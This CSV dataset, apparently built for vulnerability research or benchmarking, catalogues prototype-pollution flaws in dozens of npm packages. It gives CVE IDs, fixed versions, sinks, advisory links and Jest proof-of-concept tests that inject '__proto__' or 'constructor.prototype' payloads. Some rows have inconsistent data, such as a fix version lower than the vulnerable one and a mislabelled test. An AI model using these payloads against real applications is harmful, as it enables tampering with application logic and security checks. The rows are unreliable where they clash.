Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
prototype-pollution,CVE-2020-8158,typeorm,0.2.24,0.2.25,prototype-pollution/typeorm_0.2.24,"//https://hackerone.com/reports/869574

function isObject(item) {
  return item && typeof item === ""object"" && !Array.isArray(item);
}
const assert = require(""assert"");

function mergeDeep(target, ...sources) {
  if (!sources.length) return target;
  const source = sources.shift();

  if (isObject(target) && isObject(source)) {
    for (const key in source) {
      const value = source[key];
      if (value instanceof Promise) continue;

      if (
        isObject(value) &&
        !(value instanceof Map) &&
        !(value instanceof Set) &&
        !(value instanceof Date) &&
        !(value instanceof Buffer) &&
        !(value instanceof RegExp) &&
        !(value instanceof URL)
      ) {
        if (!target[key])
          Object.assign(target, {
            [key]: Object.create(Object.getPrototypeOf(value)),
          });
        mergeDeep(target[key], value);
      } else {
        Object.assign(target, { [key]: value });
      }
    }
  }

  return mergeDeep(target, ...sources);
}

test(""prototype pollution in typeORM"", () => {
  // const util = require(""typeorm/util/OrmUtils"");
  const a = {};
  const b = JSON.parse(`{""__proto__"":{""polluted"":""yes""}}`);

  expect({}.polluted).toBe(undefined);

  // util.OrmUtils.mergeDeep(a, b);
  mergeDeep(a, b);
  expect({}.polluted).toBe(""yes"");
});
",n/a,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-TYPEORM-590152; https://github.com/advisories/GHSA-pf2j-9qmp-jqr2
prototype-pollution,CVE-2020-7721,node-oojs,1.4.0,n/a,prototype-pollution/node-oojs_1.4.0,"// https://snyk.io/vuln/SNYK-JS-NODEOOJS-598678
test(""prototype pollution in node-oojs"", () => {
  expect({}.polluted).toBe(undefined);

  require(""node-oojs"");
  oojs.setPath({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).not.toBe(undefined);
});
",n/a,bin/format/oojs.js:65:39,https://security.snyk.io/vuln/SNYK-JS-NODEOOJS-598678; https://github.com/advisories/GHSA-j4rw-x3vg-c8r7
prototype-pollution,CVE-2021-23329,nested-object-assign,1.0.3,1.0.4,prototype-pollution/nested-object-assign_1.0.3,"//https://snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977

test(""prototype pollution in nested-object-assign"", () => {
  const assign = require(""nested-object-assign"");
  expect({}.polluted).toBe(undefined);
  assign({}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/nestedObjectAssign.js:1:787,https://security.snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977; https://github.com/advisories/GHSA-c497-v8pv-ch6x
prototype-pollution,,plain-object-merge,1.0.1,1.0.2,prototype-pollution/plain-object-merge_1.0.1,"//https://hackerone.com/reports/871156
test(""prototype pollution in plain-object-merge"", () => {
  const merge = require(""plain-object-merge"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge([{}, payload]);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/fabiospampinato/plain-object-merge/commit/e2b59efa2216957815643c48797e2e2eae8ca2b2,dist/index.js:18:29,https://security.snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643; 
prototype-pollution,CVE-2021-3918,json-schema,0.3.0,0.4.0,prototype-pollution/json-schema_0.3.0,"//https://huntr.dev/bounties/bb6ccd63-f505-4e3a-b55f-cd2662c261a9/
test(""prototype pollution in json-schema"", () => {
  const { validate } = require(""json-schema"");
  const instance = JSON.parse(`
    {
      ""$schema"":{
        ""type"": ""object"",
        ""properties"":{
          ""__proto__"": {
            ""type"": ""object"",
            
            ""properties"":{
              ""polluted"": {
                  ""type"": ""string"",
                  ""default"": ""yes""
              }
            }
          }
        },
        ""__proto__"": {}
      }
    }`);

  expect({}.polluted).toBe(undefined);

  validate(instance);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741,lib/validate.js:217:27,https://huntr.dev/bounties/bb6ccd63-f505-4e3a-b55f-cd2662c261a9/; https://github.com/advisories/GHSA-896r-f27r-55mw; https://security.snyk.io/vuln/SNYK-JS-JSONSCHEMA-1920922
prototype-pollution,,flat-wrap,1.0.2,n/a,prototype-pollution/flat-wrap_1.0.2,"test(""prototype pollution in flat-wrap"", () => {
  const { unflatten } = require(""flat-wrap"");

  expect({}.polluted).toBe(undefined);

  unflatten({
    ""__proto__.polluted"": ""yes"",
  });

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:193:43,https://github.com/advisories/GHSA-g7h8-p22m-2rvx; 
prototype-pollution,CVE-2021-25915,changeset,0.1.0,0.2.6,prototype-pollution/changeset_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25915
test(""prototype pollution in changeset"", () => {
  expect({}.polluted).toBe(undefined);

  const changeset = require(""changeset"");
  const patch = [{ type: ""put"", key: [""__proto__"", ""polluted""], value: ""yes"" }];
  changeset.apply(patch, {}, true);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/eugeneware/changeset/commit/9e588844edbb9993b32e7366cc799262b4447f99,index.js:81:25,https://security.snyk.io/vuln/SNYK-JS-CHANGESET-1083989; 
prototype-pollution,CVE-2020-28450,decal,2.1.3,n/a,prototype-pollution/decal_2.1.3,"//https://snyk.io/vuln/SNYK-JS-DECAL-1051028
test(""prototype pollution in decal"", () => {
  const decal = require(""decal"");

  expect({}.polluted).toBe(undefined);

  const o = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  decal.extend({}, true, o);

  expect({}.polluted).toBe(""yes"");
});
",n/a,src/utils/extend.js:50:62,https://security.snyk.io/vuln/SNYK-JS-DECAL-1051028; https://github.com/advisories/GHSA-j32x-j8pj-pg2h
prototype-pollution,CVE-2021-3645,@viking04/merge,1.0.0,1.0.2,prototype-pollution/viking04-merge_1.0.0,"//https://github.com/viking04/merge/commit/baba40332080b38b33840d2614df6d4142dedaf6
test(""prototype pollution in config-handler"", () => {
  const merge = require(""@viking04/merge"");
  expect({}.polluted).toBe(undefined);

  let a = {};
  var prototype_pollution_test = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  merge(a, prototype_pollution_test);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/viking04/merge/commit/baba40332080b38b33840d2614df6d4142dedaf6,merge/index.js:9:18,https://security.snyk.io/vuln/SNYK-JS-VIKING04MERGE-1584118; https://github.com/advisories/GHSA-cqqh-49mx-fq63
prototype-pollution,CVE-2021-23438,mpath,0.4.1,0.8.4,prototype-pollution/mpath_0.4.1,"//https://hackerone.com/reports/390860
test(""prototype pollution in mpath "", () => {
  var mpath = require(""mpath"");

  var obj = {};

  expect({}.polluted).toBe(undefined);

  mpath.set(""__proto__.polluted"", ""yes"", obj);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc,lib/index.js:269:17,https://security.snyk.io/vuln/SNYK-JS-MPATH-1577289; https://github.com/advisories/GHSA-p92x-r36w-9395
prototype-pollution,CVE-2020-7722,nodee-utils,1.2.2,1.2.3,prototype-pollution/nodee-utils_1.2.2,"//https://snyk.io/vuln/SNYK-JS-NODEEUTILS-598679

test(""prototype pollution in nodee-utils"", () => {
  const { object } = require(""nodee-utils"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  object.deepSet({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/nodee-apps/utils/commit/52460d936c52f03c9907bc99ac5e890970cef83c,lib/object.js:210:40,https://security.snyk.io/vuln/SNYK-JS-NODEEUTILS-598679; https://github.com/advisories/GHSA-p6jh-p7q8-pcrg
prototype-pollution,CVE-2020-7639,@eivifj/dot,1.0.2,1.0.3,prototype-pollution/eivifj-dot_1.0.2,"//https://snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435
test(""prototype pollution in @eivifj/dot"", () => {
  const a = require(""@eivifj/dot"");
  const path = ""__proto__.polluted"";

  expect({}.polluted).toBe(undefined);

  a.set({}, path, ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,dot/index.js:22:13,https://security.snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435; 
prototype-pollution,,i18next,19.7.0,19.8.5,prototype-pollution/i18next_19.7.0,"//https://hackerone.com/reports/968355#:~:text=It%20allows%20to%20set%20many,example%2C%20you%20can%20call%20i18next.&text=To%20pollute%20Object%20you%20could,polluted%3A%20true%20%7D%20%7D%20%7D%20.

// const i18next = require(""i18next/dist/cjs/i18next"");

function deepExtend(target, source, overwrite) {
  /* eslint no-restricted-syntax: 0 */
  for (const prop in source) {
    if (prop !== ""__proto__"") {
      if (prop in target) {
        // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch
        if (
          typeof target[prop] === ""string"" ||
          target[prop] instanceof String ||
          typeof source[prop] === ""string"" ||
          source[prop] instanceof String
        ) {
          if (overwrite) target[prop] = source[prop];
        } else {
          deepExtend(target[prop], source[prop], overwrite);
        }
      } else {
        target[prop] = source[prop];
      }
    }
  }
  return target;
}

test(""prototype pollution in i18next "", () => {
  const translations =
    '{ ""constructor"": { ""prototype"": { ""polluted"": ""yes""} } }';
  const existingData = {};

  expect({}.polluted).toBe(undefined);

  deepExtend(existingData, JSON.parse(translations), true);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/i18next/i18next/commit/932f5f662893376254d826e9b01dc4e4c0cd91c0,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-I18NEXT-1065979; https://github.com/advisories/GHSA-cmh5-qc8w-xvcq
prototype-pollution,,shvl,2.0.1,2.0.3,prototype-pollution/shvl_2.0.1,"//https://snyk.io/vuln/SNYK-JS-SHVL-1085284

test(""prototype pollution in shvl"", () => {
  var shvl = require(""shvl"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  shvl.set(obj, ""constructor.prototype.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/robinvdvleuten/shvl/commit/4ed0edfa70f7778556f7b7e9ef1ee5d6d002fce2,index.js:10:40,https://security.snyk.io/vuln/SNYK-JS-SHVL-1085284; 
prototype-pollution,CVE-2020-15256,object-path-set,1.0.0,1.0.1,prototype-pollution/object-path-set_1.0.0,"//https://snyk.io/vuln/SNYK-JS-OBJECTPATH-1017036
test(""prototype pollution in object-path-set "", () => {
  const setPath = require(""object-path-set"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setPath({}, ""__proto__.polluted"", ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/skratchdot/object-path-set/commit/55f06d75abf5885f9cba3b7760acb38d7d7d06c0,index.js:19:13,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATHSET-607908; https://github.com/advisories/GHSA-cwx2-736x-mf6w
prototype-pollution,CVE-2020-7701,madlib-object-utils,0.1.6,0.1.7,prototype-pollution/madlib-object-utils_0.1.6,"//https://snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676
test(""prototype pollution in madlib-object-utils"", () => {
  expect({}.polluted).toBe(undefined);

  const objectUtils = require(""madlib-object-utils"");
  objectUtils.setValue(""__proto__.polluted"", {}, ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/utils.js:56:22,https://security.snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676; https://github.com/advisories/GHSA-jvf5-q4h5-2jmj
prototype-pollution,CVE-2019-10744,lodash,4.17.10,4.17.12,prototype-pollution/lodash_4.17.10,"//https://security.snyk.io/vuln/SNYK-JS-LODASH-450202
test(""prototype pollution in lodash"", () => {
  const mergeFn = require(""lodash"").defaultsDeep;
  const payload = '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}';
  expect({}.polluted).toBe(undefined);

  mergeFn({}, JSON.parse(payload));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/sailshq/lodash/pull/1/commits/c3fd203b3be87a8177f7f00824033c95f981f984,lodash.js:2573:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-450202; https://github.com/advisories/GHSA-jf85-cpcp-j695
prototype-pollution,CVE-2020-28503,copy-props,2.0.4,2.0.5,prototype-pollution/copy-props_2.0.4,"//https://snyk.io/vuln/SNYK-JS-COPYPROPS-1082870
test(""prototype pollution in copy-props"", () => {
  expect({}.polluted).toBe(undefined);

  const copyProps = require(""copy-props"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  copyProps(JSON.parse(malicious_payload), {});

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:197:14,https://security.snyk.io/vuln/SNYK-JS-COPYPROPS-1082870; https://github.com/advisories/GHSA-897m-rjf5-jp39
prototype-pollution,CVE-2021-23373,set-deep-prop,1.0.0,n/a,prototype-pollution/set-deep-prop_1.0.0,"//https://snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231
test(""prototype pollution in safe-object2"", () => {
  const setDeepProp = require(""set-deep-prop"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setDeepProp({}, [""__proto__"", ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,set-deep-prop.js:20:34,https://security.snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231; 
prototype-pollution,,fast-json-patch,2.0.4,2.2.1,prototype-pollution/fast-json-patch_2.0.4,"//https://github.com/Starcounter-Jack/JSON-Patch/issues/216
test(""prototype pollution in fast-json-patch"", () => {
  let fp = require(""fast-json-patch"");
  const patch = [{ op: ""replace"", path: ""/__proto__/polluted"", value: ""yes"" }];

  expect({}.polluted).toBe(undefined);

  fp.applyPatch({}, patch);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/Starcounter-Jack/JSON-Patch/pull/219/commits/dd5d353f5d65888aeac91359484a73f0e2a9e5bd,lib/core.js:28:18,https://security.snyk.io/vuln/SNYK-JS-FASTJSONPATCH-595663; 
prototype-pollution,CVE-2021-32736,think-helper,1.1.0,1.1.7,prototype-pollution/think-helper_1.1.0,"//
test(""prototype pollution in think-helper"", () => {
  const a = require(""think-helper"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  a.extend(obj, JSON.parse('{""__proto__"":{""polluted"":""yes""}}'));

  expect({}.polluted).toBe(""yes"");
});
",,index.js:122:22,https://security.snyk.io/vuln/SNYK-JS-THINKHELPER-1315383; https://github.com/advisories/GHSA-vr5m-3h59-7jcp
prototype-pollution,CVE-2019-10746,mixin-deep,2.0.0,2.0.1,prototype-pollution/mixin-deep_2.0.0,"//https://snyk.io/vuln/SNYK-JS-MIXINDEEP-450212
test(""prototype pollution in mixin-deep "", () => {
  const mixin = require(""mixin-deep"");
  const payload = '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}';

  let obj = {};

  expect({}.polluted).toBe(undefined);

  mixin({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9,index.js:21:17,https://security.snyk.io/vuln/SNYK-JS-MIXINDEEP-450212; https://github.com/advisories/GHSA-fhjf-83wg-r2j9
prototype-pollution,CVE-2021-4278,tree-kit,0.6.1,0.7.0,prototype-pollution/tree-kit_0.6.1,"test(""prototype pollution in tree-kit"", () => {
  const { dotPath } = require('tree-kit')
  obj = {};
  expect({}.polluted).toBe(undefined);
  dotPath.set({}, [""__proto__"", ""polluted""], ""yes"") 
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/cronvel/tree-kit/commit/c90d45f4f0e1266867be136670eddeb99b2a32a5,,https://security.snyk.io/vuln/SNYK-JS-TREEKIT-1077068; 
prototype-pollution,CVE-2020-7641,grunt-util-property,0.0.2,n/a,prototype-pollution/grunt-util-property_0.0.2,"//https://snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088
test(""prototype pollution in grunt-util-property"", () => {
  const grunt = require(""grunt"");
  const a = require(""grunt-util-property"");

  expect({}.polluted).toBe(undefined);

  let b = a(grunt);
  b.call({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,main.js:41:21,https://security.snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088; 
prototype-pollution,CVE-2020-7617,ini-parser,0.0.2,n/a,prototype-pollution/ini-parser_0.0.2,"// https://snyk.io/vuln/SNYK-JS-INIPARSER-564122
test(""prototype pollution in ini-parser"", () => {
  expect({}.polluted).toBe(undefined);

  let a = require(""ini-parser"");
  a.parse(""[__proto__]\npolluted=yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:14:20,https://security.snyk.io/vuln/SNYK-JS-INIPARSER-564122; https://github.com/advisories/GHSA-96r7-mrqf-jhcc
prototype-pollution,CVE-2020-28274,deepref,1.1.1,1.2.1,prototype-pollution/deepref_1.1.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28274
test(""prototype pollution in deepref"", () => {
  expect({}.polluted).toBe(undefined);

  const deepref = require(""deepref"");
  deepref.set({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/isaymatato/deepref/commit/24935e6a1060cb09c641d3075982f0b44cfca4c2,index.js:29:28,https://security.snyk.io/vuln/SNYK-JS-DEEPREF-1049536; https://github.com/advisories/GHSA-7c7g-72q7-4xhm
prototype-pollution,CVE-2020-8203,lodash,4.17.11,4.17.16,prototype-pollution/lodash_4.17.11,"// https://hackerone.com/reports/712065
test(""prototype pollution in lodash"", () => {
  expect({}.polluted).toBe(undefined);

  const _ = require(""lodash"");
  _.zipObjectDeep([""__proto__.polluted""], [""yes""]);

  expect({}.polluted).toBe(""yes"");
});
",n/a,lodash.js:2559:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-608086; https://github.com//advisories/GHSA-p6mc-m468-83gw
prototype-pollution,CVE-2020-7714,confucious,0.0.12,n/a,prototype-pollution/confucious_0.0.12,"//https://snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665
test(""prototype pollution in confucious"", () => {
  expect({}.polluted).toBe(undefined);

  const confucious = require(""confucious"");
  confucious.set(""__proto__:polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,confucious.js:48:21,https://security.snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665; https://github.com/advisories/GHSA-fmrr-mx6j-h3h5
prototype-pollution,CVE-2020-7707,property-expr,2.0.2,2.0.3,prototype-pollution/property-expr_2.0.2,"//https://hackerone.com/reports/910206
test(""prototype pollution in property-expr"", () => {
  let expr = require(""property-expr"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  expr.setter(""constructor.prototype.polluted"")(obj, ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jquense/expr/commit/df846910915d59f711ce63c1f817815bceab5ff7,index.js:55:28,https://security.snyk.io/vuln/SNYK-JS-PROPERTYEXPR-598800; https://github.com/advisories/GHSA-6fw4-hr69-g3rv
prototype-pollution,,rfc6902,4.0.2,5.0.0,prototype-pollution/rfc6902_4.0.2,"//https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318
test(""prototype pollution in rfc6902"", () => {
  expect({}.polluted).toBe(undefined);
  var rfc6902 = require(""rfc6902"");
  var obj = {};
  rfc6902.applyPatch(obj, [
    { op: ""add"", path: ""/__proto__/polluted"", value: ""yes"" },
  ]);
  expect({}.polluted).toBe(""yes"");
});
",n/a,patch.js:57:21,https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318; 
prototype-pollution,CVE-2020-28462,ion-parser,0.5.2,n/a,prototype-pollution/ion-parser_0.5.2,"//https://snyk.io/vuln/SNYK-JS-IONPARSER-1048971
test(""prototype pollution in ion-parser"", () => {
  const fs = require(""fs"");
  const path = require(""path"");
  const ION = require(""ion-parser"");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  ION.parse(
    fs.readFileSync(path.resolve(__dirname, ""./payload.toml""), ""utf-8"")
  );
  expect({}.polluted).toBe(""yes"");
});
",n/a,parser.js:359:13,https://security.snyk.io/vuln/SNYK-JS-IONPARSER-1048971; 
prototype-pollution,,keyd,1.3.4,1.4.3,prototype-pollution/keyd_1.3.4,"//https://hackerone.com/reports/877515
test(""prototype pollution in keyd"", () => {
  expect({}.polluted).toBe(undefined);

  const keyd = require(""keyd"");
  keyd({}).set(""__proto__.polluted"", ""yes""); //payload

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:76:60,https://security.snyk.io/vuln/SNYK-JS-KEYD-674472; 
prototype-pollution,,objutil,2.17.3,n/a,prototype-pollution/objutil_2.17.3,"//https://snyk.io/vuln/SNYK-JS-OBJUTIL-559496

test(""prototype pollution in objutil"", () => {
  const { merge, remove } = require(""objutil"");

  let a = { x: 1, y: { w: 1, z: 2 } };
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  result = merge(a, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,dist/objutil.cjs.js:192:59,https://security.snyk.io/vuln/SNYK-JS-OBJUTIL-559496; 
prototype-pollution,,prototyped.js,2.0.0,2.0.1,prototype-pollution/prototyped.js_2.0.0,"//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
test(""prototype pollution in merge-recursive"", () => {
  // const merge = require(""merge-recursive"").recursive;
  // const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  // obj = {};

  // expect({}.polluted).toBe(undefined);

  // merge({}, JSON.parse(malicious_payload));

  // expect({}.polluted).toBe(""yes"");

  const set = require(""prototyped.js/dist/object/set"").default;
  console.log(""Prototype before set"", {}.polluted);
  set({}, ""__proto__.isAdmin"", true);
  console.log(""Prototype after set"", {}.polluted);
});
",https://github.com/ardalanamini/prototyped.js/commit/3ab56e78250d3d5b44ac03938d3d04591b206730,lib/index.js:66:14,https://security.snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824; 
prototype-pollution,,objtools,3.0.0,n/a,prototype-pollution/objtools_3.0.0,"//https://hackerone.com/reports/878394

test(""prototype pollution in objtools"", () => {
  const objtools = require(""objtools"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}'); //payload
  obj = {};

  expect({}.polluted).toBe(undefined);

  objtools.merge({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/index.js:440:18,https://security.snyk.io/vuln/SNYK-JS-OBJTOOLS-674471; 
prototype-pollution,CVE-2020-7742,simpl-schema,1.10.0,1.10.2,prototype-pollution/simpl-schema_1.10.0,"//https://snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157
test(""prototype pollution in simpl-schema"", () => {
  const SimpleSchema = require(""simpl-schema"").default;
  let obj = {};

  expect({}.polluted).toBe(undefined);

  SimpleSchema.setDefaultMessages(
    JSON.parse('{""__proto__"":{""polluted"":""yes""}}')
  );
  expect({}.polluted).toBe(""yes"");
});
",n/a,dist/utility/merge.js:31:27,https://security.snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157; https://github.com/advisories/GHSA-9mx2-prfp-8hqp
prototype-pollution,CVE-2018-3751,merge-recursive,0.0.3,n/a,prototype-pollution/merge-recursive_0.0.3,"//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
test(""prototype pollution in merge-recursive"", () => {
  const merge = require(""merge-recursive"").recursive;
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/index.js:66:14,https://security.snyk.io/vuln/npm:merge-recursive:20180415; https://github.com/advisories/GHSA-cvxm-f295-x957
prototype-pollution,CVE-2021-25949,set-getter,0.1.0,0.1.1,prototype-pollution/set-getter_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25949
test(""prototype pollution in set-getter "", () => {
  var setGetter = require(""set-getter"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setGetter(obj, ""__proto__.polluted"", function (polluted) {
    return ""yes"";
  });
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/doowb/set-getter/commit/66eb3f0d4686a4a8c7c3d6f7ecd8e570b580edc4,,https://security.snyk.io/vuln/SNYK-JS-SETGETTER-1303099; https://github.com/advisories/GHSA-jv35-xqg7-f92r
prototype-pollution,CVE-2020-7743,mathjs,7.4.0,7.5.1,prototype-pollution/mathjs_7.4.0,"//https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7743
test(""prototype pollution in mathjs "", () => {
  var mathMod = require(""mathjs"");
  const mathjs = mathMod.create(mathMod.all);

  expect({}.polluted).toBe(undefined);

  const newConfig = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  mathjs.config(newConfig);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/josdejong/mathjs/commit/ecb80514e80bce4e6ec7e71db8ff79954f07c57e,lib/utils/object.js:131:17,https://security.snyk.io/vuln/SNYK-JS-MATHJS-1016401; https://github.com/advisories/GHSA-x2fc-mxcx-w4mf
prototype-pollution,CVE-2020-7643,paypal-adaptive,0.4.1,n/a,prototype-pollution/paypal-adaptive_0.4.1,"//https://snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089

test(""prototype pollution in paypal-adaptive"", () => {
  expect({}.polluted).toBe(undefined);

  const PayPal = require(""paypal-adaptive"");
  const p = new PayPal(
    JSON.parse(
      '{""__proto__"": {""polluted"": ""yes""}, ""userId"": ""foo"", ""password"": ""bar"", ""signature"": ""abcd"", ""appId"": ""1234"", ""sandbox"": ""1234""}'
    )
  );

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/paypal-adaptive.js:31:22,https://security.snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089; https://github.com/advisories/GHSA-v3r2-3fp4-rp46
prototype-pollution,,nestie,1.0.0,1.0.2,prototype-pollution/nestie_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25947
test(""prototype pollution in nestie"", () => {
  const { nestie } = require(""nestie"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  nestie({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/lukeed/nestie/commit/c571c77928ecd7f256a935c7c3860f33dac4653f,dist/index.js:29:14,https://security.snyk.io/vuln/SNYK-JS-NESTIE-1300518; https://github.com/advisories/GHSA-m7rg-8wvq-846v
prototype-pollution,CVE-2018-16492,extend,3.0.1,1.0.1,prototype-pollution/extend_3.0.1,"//https://hackerone.com/reports/381185
test(""prototype pollution in extend "", () => {
  let extend = require(""extend"");
  let payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  var obj = {};

  expect({}.polluted).toBe(undefined);

  extend(true, {}, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/justmoon/node-extend/commit/0e68e71d93507fcc391e398bc84abd0666b28190,index.js:77:20,https://security.snyk.io/vuln/npm:extend:20180424; https://github.com/advisories/GHSA-qrmc-fj45-qfc2
